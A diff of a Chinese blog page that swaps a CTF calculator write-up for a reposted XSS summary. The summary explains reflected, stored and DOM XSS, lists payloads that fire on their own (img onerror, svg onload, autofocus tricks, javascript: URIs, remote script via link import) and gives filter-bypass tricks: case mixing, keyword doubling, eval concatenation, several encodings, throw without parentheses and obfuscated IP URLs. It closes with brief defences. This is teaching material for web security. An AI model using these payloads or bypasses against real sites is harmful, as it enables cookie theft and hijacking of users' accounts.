@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Web：Calculator解题总结 · MUZIBing&#39;s BLOG</title>
+    <title>【装载】 XSS 总结 · MUZIBing&#39;s BLOG</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -232,7 +232,7 @@
                 <a href="/">MUZIBing&#39;s BLOG</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Web：Calculator解题总结</a>
+                <a href="#" class="post-name">【装载】 XSS 总结</a>
             </div>
     </div>
     
@@ -256,13 +256,13 @@ height:50vh;
     <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/94.png)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Web：Calculator解题总结
+            【装载】 XSS 总结
             <!-- 404 -->
             
         </h1>
@@ -281,18 +281,20 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="解题总结">解题总结</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="XSS">XSS</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">2.2k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2.7k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/03/08</span>
+                    <span class="post-intro-time">2020/02/23</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -416,109 +418,150 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>     这几天做出来的题目，难度最大且花费时间最长的莫不过Web：Calculator和Web：RapidTyping，今天又对Web：Calculator这道题目的脚本做了一下改善，并分析了一下GET和POST的区别。</p>
-<h3 id="1-前期准备"><a class="markdownIt-Anchor" href="#1-前期准备"></a> 1. 前期准备</h3>
-<blockquote>
+        <h1 id="简述"><a class="markdownIt-Anchor" href="#简述"></a> 简述</h1>
+<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+<h1 id="常用的xss攻击手段和目的"><a class="markdownIt-Anchor" href="#常用的xss攻击手段和目的"></a> 常用的XSS攻击手段和目的</h1>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.盗用cookie，获取敏感信息。</span><br><span class="line">2.利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</span><br><span class="line">3.利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。</span><br><span class="line">4.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</span><br><span class="line">5.在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。</span><br></pre></td></tr></table></figure>
+<h1 id="分类"><a class="markdownIt-Anchor" href="#分类"></a> 分类</h1>
+<h2 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 反射型</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</span><br><span class="line">反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</span><br></pre></td></tr></table></figure>
+<h2 id="存储型"><a class="markdownIt-Anchor" href="#存储型"></a> 存储型</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</span><br><span class="line">此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</span><br></pre></td></tr></table></figure>
+<h2 id="dom型"><a class="markdownIt-Anchor" href="#dom型"></a> DOM型</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</span><br></pre></td></tr></table></figure>
+<h1 id="无任何过滤情况下"><a class="markdownIt-Anchor" href="#无任何过滤情况下"></a> 无任何过滤情况下</h1>
+<h2 id="一些常见标签"><a class="markdownIt-Anchor" href="#一些常见标签"></a> 一些常见标签</h2>
+<p><strong>PS：下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发，还有我测试的浏览器是火狐，Chrome，IE11.0，其它的浏览器没有去测试，有兴趣的师傅可以测试一下 =。=</strong></p>
+<p><code>script</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><code>img</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
+<p><code>input</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line">&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>
+<p><code>details</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br><span class="line">使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line">&lt;details open ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><code>svg</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
+<p><code>select</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure>
+<p><code>iframe</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p><code>video</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><code>audio</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
+<p><code>body</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
+<p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body</span><br><span class="line">onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure>
+<p><code>textarea</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</span><br></pre></td></tr></table></figure>
+<p><code>keygen</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></table></figure>
+<p><code>marquee</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure>
+<p><code>isindex</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</span><br></pre></td></tr></table></figure>
+<h3 id="利用link远程包含js文件"><a class="markdownIt-Anchor" href="#利用link远程包含js文件"></a> 利用link远程包含js文件</h3>
+<p><strong>PS：在无CSP的情况下才可以</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="javascript伪协议"><a class="markdownIt-Anchor" href="#javascript伪协议"></a> javascript伪协议</h3>
+<p><code>&lt;a&gt;</code>标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p><code>&lt;iframe&gt;</code>标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p><code>&lt;img&gt;</code>标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;//IE7以下</span><br></pre></td></tr></table></figure>
+<p><code>&lt;form&gt;</code>标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="其它"><a class="markdownIt-Anchor" href="#其它"></a> 其它</h3>
+<p>expression属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=&quot;xss:expression(alert(&apos;xss&apos;&apos;))&quot;&gt; // IE7以下</span><br><span class="line">&lt;div style=&quot;color:rgb(&apos;&apos;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下</span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下</span><br></pre></td></tr></table></figure>
+<p>background属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure>
+<h1 id="有过滤的情况下"><a class="markdownIt-Anchor" href="#有过滤的情况下"></a> 有过滤的情况下</h1>
+<h2 id="过滤空格"><a class="markdownIt-Anchor" href="#过滤空格"></a> 过滤空格</h2>
+<p>用<code>/</code>代替空格</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="过滤关键字"><a class="markdownIt-Anchor" href="#过滤关键字"></a> 过滤关键字</h2>
+<h3 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过"></a> 大小写绕过</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="双写关键字"><a class="markdownIt-Anchor" href="#双写关键字"></a> 双写关键字</h3>
+<p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="字符拼接"><a class="markdownIt-Anchor" href="#字符拼接"></a> 字符拼接</h3>
+<p>利用eval</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>利用top</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="其它字符混淆"><a class="markdownIt-Anchor" href="#其它字符混淆"></a> 其它字符混淆</h3>
+<p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>
+下面举几个简单的例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;</span><br><span class="line">2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过"></a> 编码绕过</h3>
+<p><code>Unicode编码绕过</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><code>url编码绕过</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p><code>Ascii码绕过</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p><code>hex绕过</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt;</span><br></pre></td></tr></table></figure>
+<p><code>八进制</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt;</span><br></pre></td></tr></table></figure>
+<p><code>base64绕过</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="过滤双引号单引号"><a class="markdownIt-Anchor" href="#过滤双引号单引号"></a> 过滤双引号，单引号</h2>
+<p>1.如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`xss`);&gt;</span><br></pre></td></tr></table></figure>
+<p>2.使用编码绕过，具体看上面我列举的例子，我就不多赘述了</p>
+<h2 id="过滤括号"><a class="markdownIt-Anchor" href="#过滤括号"></a> 过滤括号</h2>
+<p>当括号被过滤的时候可以使用throw来绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="过滤url地址"><a class="markdownIt-Anchor" href="#过滤url地址"></a> 过滤url地址</h2>
+<h3 id="使用url编码"><a class="markdownIt-Anchor" href="#使用url编码"></a> 使用url编码</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="使用ip"><a class="markdownIt-Anchor" href="#使用ip"></a> 使用IP</h3>
+<p><code>1.十进制IP</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;</span><br></pre></td></tr></table></figure>
+<p><code>2.八进制IP</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;</span><br></pre></td></tr></table></figure>
+<p><code>3.hex</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;</span><br></pre></td></tr></table></figure>
+<p>4.html标签中用<code>//</code>可以代替<code>http://</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;</span><br></pre></td></tr></table></figure>
+<p>5.使用<code>\\</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是要注意在windows下\本身就有特殊用途，是一个path 的写法，所以\\在Windows下是file协议，在linux下才会是当前域的协议</span><br></pre></td></tr></table></figure>
+<p>Windows下<br>
+<img src="/images/94-1.gif" alt><br>
+<img src="/images/94-2.gif" alt><br>
+6.使用中文逗号代替英文逗号<br>
+如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://www。baidu。com`&quot;&gt;//会自动跳转到百度</span><br></pre></td></tr></table></figure>
+<h1 id="如何防止xss"><a class="markdownIt-Anchor" href="#如何防止xss"></a> 如何防止xss</h1>
 <ul>
-<li>工具：谷歌浏览器</li>
-<li>知识：python Requests模块（POST | GET | Session()）、Re模块（findall() | compile()）、正则表达式、eval()</li>
+<li>过滤一些危险字符，以及转义<code>&amp; &lt; &gt; &quot; ' /</code>等危险字符</li>
+<li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。</li>
+<li>设置CSP(Content Security Policy)</li>
+<li>输入内容长度限制</li>
 </ul>
-</blockquote>
-<h3 id="2-思考过程"><a class="markdownIt-Anchor" href="#2-思考过程"></a> 2. 思考过程</h3>
-<p>1.如何计算网页上的算数公式，并提交成功，服务器响应请求呢？</p>
-<blockquote>
-<p>这是在做这道题首先要弄明白的问题，只有将整个流程搞懂、弄清，才能分布的去解题：<br>
-    <font color="brwon">①首先要获取网页地址，得到网页上的文本；<br>
-    ②把相应的算术公式“拿出来”单独计算，得到结果（answer）；<br>
-    ③把所得结果如何提交给请求服务器，返回相应的内容；<br>
-    ④如何让服务器知道获得算式的和提交答案的是一个人；</font><br>
-在正式做题前，我将这个问题拆分为这四步，但是每一步是如何实现的呢？这就有了以下的分析。</p>
-</blockquote>
-<p>2.如何请求获取网页上的内容？</p>
-<blockquote>
-<p>对于获取网页所用的协议为HTTP的原理，其实这个知识点在前面的流量分析中有所提及（<a href="https://muzibing.github.io/2019/03/01/2019.03.01%EF%BC%887%EF%BC%89/">GET和POST的区别</a>），今天就不过多的谈及，那么今天主要讲一下python Requests库中关于两者使用的语法：<br>
-    ①首先要<strong>导入requests模块</strong>（它是一个python HTTP库），因为post和get请求都被包含在这个模块中；<br>
-    ②GET：如果是手工构建 URL，那么数据会以键/值对的形式置于 URL 中，跟在一个?的后面。例如，<a href="http://httpbin.org/get?key=val%E3%80%82" target="_blank" rel="noopener">httpbin.org/get?key=val。</a> Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。<br>
-        <font color="blue">r = requests.get(“url”, <strong>params</strong>={‘key’:value})</font><br>
-    ②POST：通常，想要发送一些编码为表单形式的数据——非常像一个 HTML 表单。要实现这个，只需简单地传递一个字典给 data 参数。数据字典在发出请求时会自动编码为表单形式：<br>
-        <font color="blue">payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}<br>
-        r = requests.post(“url”, <strong>data</strong>=payload)<br>
-        print(r.text)</font><br>
-那么对于第①个问题就有了相应的解决办法，那么怎么解决获取算术公式，并加以计算这个问题呢？</p>
-</blockquote>
-<p>3.如何得到要求计算式子的结果呢？</p>
-<blockquote>
-<p>这里也应该相应的进行拆分分析：<br>
-<font color="red">1. 我如何才能获取那些数字和计算符号呢？</font><br>
-通过查阅有关资料，得到了re模块的两个函数**“re.findall()”<strong>和</strong>“re.compile()”**以及有关正则表达式的应用:<br>
-<br>        ▶ <strong>re.findall()</strong>：Return all non-overlapping matches of pattern in string, as a list of strings. The string is scanned left-to-right, and matches are returned in the order found. If one or more groups are present in the pattern, return a list of groups; this will be a list of tuples if the pattern has more than one group. Empty matches are included in the result unless they touch the beginning of another match.（返回字符串中pattern的所有非重叠匹配，作为字符串列表。从左到右扫描字符串，并按找到的顺序返回匹配项。 如果模式中存在一个或多个组，则返回组列表; 如果模式有多个组，这将是一个元组列表。结果中包含空匹配，除非它们触及另一个匹配的开头）<br>
-        以上是官方对re.findall()定义</p>
-<center><font color="red">findall(patern, string, flags=0)</font></center>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**pattern**: 正则中的模式字符串。
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**string**: 要被查找替换的原始字符串。
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**flags**: 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。
-<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ **re.compile()**：Compile a regular expression pattern, returning a pattern object.（编译正则表达式模式，返回模式对象）这是官方对compile()的定义，可以看出返回的是一个匹配对象，它单独使用就没有任何意义，需要和findall(), search(), match(）搭配使用。
-<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在了解了上面两个重要函数的功能后，就对要获取方法有了目标：①先通过re.compile()将正则表达式的字符串形式编译为Pattern实例，②然后通过re.findall() 从左到右扫描字符串，并按找到的顺序返回匹配项。 如果模式中存在一个或多个组，则返回组列表; 如果模式有多个组，这将是一个元组列表。 
-<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▶ **正则表达式**：如何使用正则表达式呢？这里就不过多叙述，在下面的解题的时候有所涉及。
-<br><font color="red">2. 如何将提取的算术公式进行运算呢？</font>
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面我们通过re.compile()he re.findall()函数，得到了网页上的算数公示（一个字符串），那么如何将这个字符串进行运算呢？下面再引进一个函数：
-<br><center>**eval(expression, globals=None, locals=None)**</center>
